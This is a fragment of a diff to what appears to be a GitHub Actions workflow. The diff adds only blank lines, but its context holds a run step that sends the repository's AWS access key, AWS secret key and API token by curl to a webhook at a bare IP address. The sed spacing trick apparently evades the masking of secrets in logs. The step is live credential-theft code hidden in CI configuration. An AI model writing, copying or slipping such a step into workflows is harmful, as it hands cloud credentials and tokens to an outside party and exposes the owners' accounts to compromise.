@@ -18,3 +18,6 @@ jobs:
       - run: |
             export test={{secrets.AWS_ACCESS_KEY_ID}}
             curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'\",\"apitoken\":\"${{secrets.API_TOKEN}}\"}}" http://35.219.131.13:5000/webhook
+
+
+            
